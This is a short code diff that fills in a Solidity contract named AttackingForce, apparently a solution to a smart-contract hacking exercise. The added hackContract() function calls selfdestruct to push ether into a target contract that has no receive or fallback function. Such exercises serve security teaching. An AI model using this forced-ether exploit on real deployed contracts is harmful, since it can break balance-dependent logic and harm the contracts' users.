@@ -9,7 +9,9 @@ contract AttackingForce {
         contractAddress = _contractAddress;
     }
 
+    /// @dev Force has no receive() or fallback()
     function hackContract() external {
-        // Code me!
+        /// self destruct
+        selfdestruct(payable(contractAddress));
     }
 }
